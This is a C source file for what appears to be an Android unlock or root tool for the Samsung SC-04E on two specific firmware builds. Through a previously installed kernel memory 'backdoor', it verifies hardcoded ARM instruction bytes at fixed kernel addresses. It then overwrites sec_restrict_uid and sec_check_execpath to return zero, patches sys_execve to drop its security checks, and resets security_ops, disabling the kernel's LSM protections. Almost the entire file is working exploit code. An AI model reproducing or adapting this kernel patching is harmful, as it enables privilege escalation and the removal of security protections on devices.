#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "backdoor_mmap.h"
struct check_code_t {
  unsigned long int addr;
  const unsigned long int *expected;
  size_t size;
};

struct supported_devices_t {
  const char *device;
  const char *build_id;
  struct check_code_t* check_code;
  size_t check_code_size;

  void* sec_restrict_uid_address;
  void* sec_check_execpath_address;
  void* sys_execve_address;
  void* security_ops_address;
  void* default_security_ops_address;

  const long int* return_zero;
  size_t return_zero_size;
  const long int* patched_sys_execve;
  size_t patched_sys_execve_size;
};


#define ARRAY_SIZE(x)  (sizeof (x) / sizeof ((x)[0]))
#define DEFINE_CHECK(name)  { name##_address, check_##name, sizeof(check_##name) }

#define reset_security_ops_mdi_address                0xc027ec94

#define default_security_ops_mdi_address              0xc0fa6804
#define security_ops_mdi_address                      0xc1150630

static const unsigned long int check_reset_security_ops_mdi[] = {
  0xe59f2008, //      LDR     R2, =0xc0fa6804 [$c027eca4] ; default_security_ops
  0xe59f3008, //      LDR     R3, =0xc1150630 [$c027eca8] ; security_ops
  0xe5832000, //      STR     R2, [R3]
  0xe12fff1e, //      BX      LR
  default_security_ops_mdi_address,
  security_ops_mdi_address,
};

#define sec_restrict_uid_mdi_address                  0xc00859ac

static const unsigned long int check_sec_restrict_uid_mdi[] = {
  0xe92d40f7, //      STMPW   [SP], { R0-R2, R4-R7, LR }
  0xe59f012c, //      LDR     R0, =0xc0f06040 [$c0085ae4] ; tasklist_lock
  0xeb1de652, //      BL      $c07ff304                   ; _raw_read_lock
};

#define sec_check_execpath_mdi_address                0xc0011550

static const unsigned long int check_sec_check_execpath_mdi[] = {
  0xe2503000, //      SUBS    R3, R0, #$0
  0xe92d41f0, //      STMPW   [SP], { R4-R8, LR }
  0xe1a06001, //      MOV     R6, R1
  0x01a06003, //      MOVEQ   R6, R3
  0x0a000031, //      BEQ     $c001162c
  0xeb017e97, //      BL      $c0070fc8                   ; get_mm_exe_file
};

#define sys_execve_mdi_address                        0xc00116b0

static const unsigned long int check_sys_execve_mdi[] = {
  0xe92d4ff0, //      STMPW   [SP], { R4-R11, LR }
  0xe24dd014, //      SUB     SP, SP, #$14
  0xe1a05003, //      MOV     R5, R3
  0xe1a06002, //      MOV     R6, R2
  0xe58d100c, //      STR     R1, [SP, #$c]
  0xeb04b560, //      BL      $c013ec4c                   ; getname
  0xe3700a01, //      CMNS    R0, #$1000
  0xe1a04000, //      MOV     R4, R0
  0x81a05000, //      MOVHI   R5, R0
  0x8a00009e, //      BHI     $c0011954                   ; IS_ERR(filename)
  0xe1a0200d, //      MOV     R2, SP
  0xe3c23d7f, //      BIC     R3, R2, #$1fc0
  0xe3c3303f, //      BIC     R3, R3, #$3f
  0xe593300c, //      LDR     R3, [R3, #$c]
  0xe5933204, //      LDR     R3, [R3, #$204]
  0xe5932004, //      LDR     R2, [R3, #$4]
  0xe3520000, //      CMPS    R2, #$0
  0x0a00000e, //      BEQ     $c0011734
  0xe5932008, //      LDR     R2, [R3, #$8]
  0xe3520000, //      CMPS    R2, #$0
  0x0a00000b, //      BEQ     $c0011734
};
static struct check_code_t check_code_mdi[] =
{
	  DEFINE_CHECK(reset_security_ops_mdi),
	  DEFINE_CHECK(sec_restrict_uid_mdi),
	  DEFINE_CHECK(sec_check_execpath_mdi),
	  DEFINE_CHECK(sys_execve_mdi),
};

static const unsigned long int return_zero_mdi[] = {
  0xe3a00000, //    MOV     R0, #$0
  0xe12fff1e, //    BX      LR
};

static const unsigned long int patched_sys_execve_mdi[] = {
  0xe92d4ff0, //      STMPW   [SP], { R4-R11, LR }
  0xe24dd014, //      SUB     SP, SP, #$14
  0xe1a05003, //      MOV     R5, R3
  0xe1a06002, //      MOV     R6, R2
  0xe58d100c, //      STR     R1, [SP, #$c]
  0xeb04b560, //      BL      $c013ec4c                   ; getname
  0xe3700a01, //      CMNS    R0, #$1000
  0xe1a04000, //      MOV     R4, R0
  0x81a05000, //      MOVHI   R5, R0
  0x8a00009e, //      BHI     $c0011954
  0xe1a03005, //      MOV     R3, R5
  0xe1a00004, //      MOV     R0, R4
  0xe59d100c, //      LDR     R1, [SP, #$c]
  0xe1a02006, //      MOV     R2, R6
  0xeb04a6b8, //      BL      $c013b1d0                   ; do_execve
  0xe1a05000, //      MOV     R5, R0
  0xe1a00004, //      MOV     R0, R4
  0xeb04b557, //      BL      $c013ec58                   ; putname
  0xe1a00005, //      MOV     R0, R5
  0xe28dd014, //      ADD     SP, SP, #$14
  0xe8bd8ff0, //      LDMUW   [SP], { R4-R11, PC }
};
//-------------------------------------------------------------
#define reset_security_ops_mf1_address                0xc027ecfc

#define default_security_ops_mf1_address              0xc0fa6844
#define security_ops_mf1_address                      0xc1150670

static const unsigned long int check_reset_security_ops_mf1[] = {
  0xe59f2008, //      LDR     R2, =0xc0fa6804 [$c027eca4] ; default_security_ops
  0xe59f3008, //      LDR     R3, =0xc1150630 [$c027eca8] ; security_ops
  0xe5832000, //      STR     R2, [R3]
  0xe12fff1e, //      BX      LR
  default_security_ops_mf1_address,
  security_ops_mf1_address,
};

#define sec_restrict_uid_mf1_address                  0xc0085a14

static const unsigned long int check_sec_restrict_uid_mf1[] = {
  0xe92d40f7, //      STMPW   [SP], { R0-R2, R4-R7, LR }
  0xe59f012c, //      LDR     R0, =0xc0f06040 [$c0085ae4] ; tasklist_lock
  0xeb1de65c, //      BL      $c07ff304                   ; _raw_read_lock
};

#define sec_check_execpath_mf1_address                0xc0011550

static const unsigned long int check_sec_check_execpath_mf1[] = {
  0xe2503000, //      SUBS    R3, R0, #$0
  0xe92d41f0, //      STMPW   [SP], { R4-R8, LR }
  0xe1a06001, //      MOV     R6, R1
  0x01a06003, //      MOVEQ   R6, R3
  0x0a000031, //      BEQ     $c001162c
  0xeb017ead, //      BL      $c0070fc8                   ; get_mm_exe_file
};

#define sys_execve_mf1_address                        0xc00116b0

static const unsigned long int check_sys_execve_mf1[] = {
  0xe92d4ff0, //      STMPW   [SP], { R4-R11, LR }
  0xe24dd014, //      SUB     SP, SP, #$14
  0xe1a05003, //      MOV     R5, R3
  0xe1a06002, //      MOV     R6, R2
  0xe58d100c, //      STR     R1, [SP, #$c]
  0xeb04b57a, //      bl      0xc013ecb4                   ; getname
  0xe3700a01, //      CMNS    R0, #$1000
  0xe1a04000, //      MOV     R4, R0
  0x81a05000, //      MOVHI   R5, R0
  0x8a00009e, //      BHI     $c0011954                   ; IS_ERR(filename)
  0xe1a0200d, //      MOV     R2, SP
  0xe3c23d7f, //      BIC     R3, R2, #$1fc0
  0xe3c3303f, //      BIC     R3, R3, #$3f
  0xe593300c, //      LDR     R3, [R3, #$c]
  0xe5933204, //      LDR     R3, [R3, #$204]
  0xe5932004, //      LDR     R2, [R3, #$4]
  0xe3520000, //      CMPS    R2, #$0
  0x0a00000e, //      BEQ     $c0011734
  0xe5932008, //      LDR     R2, [R3, #$8]
  0xe3520000, //      CMPS    R2, #$0
  0x0a00000b, //      BEQ     $c0011734
};
//-------------------------------------------------------------
static struct check_code_t check_code_mf1[] =
{
	  DEFINE_CHECK(reset_security_ops_mf1),
	  DEFINE_CHECK(sec_restrict_uid_mf1),
	  DEFINE_CHECK(sec_check_execpath_mf1),
	  DEFINE_CHECK(sys_execve_mf1),
};

static const unsigned long int return_zero_mf1[] = {
  0xe3a00000, //    MOV     R0, #$0
  0xe12fff1e, //    BX      LR
};

static const unsigned long int patched_sys_execve_mf1[] = {
  0xe92d4ff0, //      STMPW   [SP], { R4-R11, LR }                          0xe92d4ff0, //      STMPW   [SP], { R4-R11, LR }   //c00116b0
  0xe24dd014, //      SUB     SP, SP, #$14                                  0xe24dd014, //      SUB     SP, SP, #$14           //c00116b4
  0xe1a05003, //      MOV     R5, R3                                        0xe1a05003, //      MOV     R5, R3                   c00116b8
  0xe1a06002, //      MOV     R6, R2                                        0xe1a06002, //      MOV     R6, R2                   c00116bc
  0xe58d100c, //      STR     R1, [SP, #$c]                                 0xe58d100c, //      STR     R1, [SP, #$c]            c00116c0
  0xeb04b57a, //      BL      $c013ec4c->c013ecb4       ; getname           0xeb04b560, //      BL      $c013ec4c                c00116c4
  0xe3700a01, //      CMNS    R0, #$1000                                    0xe3700a01, //      CMNS    R0, #$1000               c00116c8
  0xe1a04000, //      MOV     R4, R0                                        0xe1a04000, //      MOV     R4, R0                   c00116cc
  0x81a05000, //      MOVHI   R5, R0                                        0x81a05000, //      MOVHI   R5, R0                   c00116d0
  0x8a00009e, //      BHI     $c0011954->XXXXXXXX       ;                   0x8a00009e, //      BHI     $c0011954                c00116d4
  0xe1a03005, //      MOV     R3, R5                                        0xe1a03005, //      MOV     R3, R5                   c00116d8
  0xe1a00004, //      MOV     R0, R4                                        0xe1a00004, //      MOV     R0, R4                   c00116dc
  0xe59d100c, //      LDR     R1, [SP, #$c]                                 0xe59d100c, //      LDR     R1, [SP, #$c]            c00116e0
  0xe1a02006, //      MOV     R2, R6                                        0xe1a02006, //      MOV     R2, R6                   c00116e4
  0xeb04a6d2, //      BL      $c013b1d0->c013b238        ; do_execve        0xeb04a6b8, //      BL      $c013b1d0                c00116e8
  0xe1a05000, //      MOV     R5, R0                                        0xe1a05000, //      MOV     R5, R0                   c00116ec
  0xe1a00004, //      MOV     R0, R4                                        0xe1a00004, //      MOV     R0, R4                   c00116f0
  0xeb04b571, //      BL      $c013ec58->c013ecc0        ; putname          0xeb04b557, //      BL      $c013ec58                c00116f4
  0xe1a00005, //      MOV     R0, R5                                        0xe1a00005, //      MOV     R0, R5                   c00116f8
  0xe28dd014, //      ADD     SP, SP, #$14                                  0xe28dd014, //      ADD     SP, SP, #$14             c00116fc
  0xe8bd8ff0, //      LDMUW   [SP], { R4-R11, PC }                          0xe8bd8ff0, //      LDMUW   [SP], { R4-R11, PC }     c0011700
};

static struct supported_devices_t supported_devices[] = 
{
  { "SC-04E", "JDQ39.SC04EOMUAMDI", 
  	check_code_mdi   , ARRAY_SIZE(check_code_mdi)    ,
	(void *)sec_restrict_uid_mdi_address,
	(void *)sec_check_execpath_mdi_address,
	(void *)sys_execve_mdi_address,
	(void *)security_ops_mdi_address,
	(void *)default_security_ops_mdi_address,
  	return_zero_mdi,ARRAY_SIZE(return_zero_mdi)    ,
  	patched_sys_execve_mdi,ARRAY_SIZE(patched_sys_execve_mdi) 
  },  // make sure it.
  { "SC-04E", "JDQ39.SC04EOMUAMF1", 
  	check_code_mf1, ARRAY_SIZE(check_code_mf1),
	(void *)sec_restrict_uid_mf1_address,
	(void *)sec_check_execpath_mf1_address,
	(void *)sys_execve_mf1_address,
	(void *)security_ops_mf1_address,
	(void *)default_security_ops_mf1_address,
  	return_zero_mf1,ARRAY_SIZE(return_zero_mf1)    ,			
  	patched_sys_execve_mf1,ARRAY_SIZE(patched_sys_execve_mf1)	
  },  // not tested yet
};
static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
check_unlock_code(struct supported_devices_t* device)
{
  unsigned long int *p;
  int pos;
  bool ret = true;

  printf("enter %s\n",__func__);

  for (pos = 0; pos < device->check_code_size; pos++) {
  	printf("check_unlock_code :%d \n",pos);
    p = backdoor_convert_to_mmaped_address((void *)(device->check_code[pos].addr));


    if (memcmp(p, device->check_code[pos].expected, device->check_code[pos].size) != 0) {
      int i;

      printf("kernel code doesn't match at 0x%08x !!\n", device->check_code[pos].addr);
      for (i = 0; i < device->check_code[pos].size / sizeof (device->check_code[pos].expected[0]); i++) {
        printf("  0x%08x\n", p[i]);
      }

      printf("\n");

      ret = false;
    }
  }

  return ret;
}

static void
do_patch(struct supported_devices_t* device)
{
  unsigned long int *p;

 void* a = device->sec_restrict_uid_address;

 printf("do_patch :sec_restrict_uid \n");
  p = backdoor_convert_to_mmaped_address((void*)(device->sec_restrict_uid_address));
  memcpy(p, device->return_zero, device->return_zero_size);

printf("do_patch :sec_check_execpath \n");
  p = backdoor_convert_to_mmaped_address(device->sec_check_execpath_address);
  memcpy(p, device->return_zero, device->return_zero_size);

printf("do_patch :sys_execve \n");
  p = backdoor_convert_to_mmaped_address(device->sys_execve_address);
  memcpy(p, device->patched_sys_execve, device->patched_sys_execve_size);

printf("do_patch :security_ops \n");
  p = backdoor_convert_to_mmaped_address(device->security_ops_address);
  *p = (unsigned long int)device->default_security_ops_address;
}

static struct supported_devices_t*
get_device(void)
{
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];
  int i;
	struct supported_devices_t* devices = (struct supported_devices_t*)0;
  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);
  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
    	  devices = &supported_devices[i];

    	  printf("detect device :%s ,%s  \n",device,build_id);

printf("sec_restrict_uid_address :%08x \n",(unsigned long)devices->sec_restrict_uid_address);
printf("check_code_size :%d \n" ,devices->check_code_size);
printf("return_zero_size :%d \n",devices->return_zero_size);


    	  
    	  break;
    }
  }
  return devices;
}

static bool
do_unlock(void)
{
  bool ret = false;
  struct supported_devices_t* device = get_device();

  if( device == (struct supported_devices_t*)0)
  {
    printf("not surppoted device :\n");
    return false;
  }
  
  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  if (check_unlock_code(device)) {
    do_patch(device);
    ret = true;
  }

  backdoor_close_mmap();

  return ret;
}



int
main(int argc, char **argv)
{

  if (!do_unlock()) {
    printf("Failed to unlock LSM.\n");
    exit(EXIT_FAILURE);
  }



  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
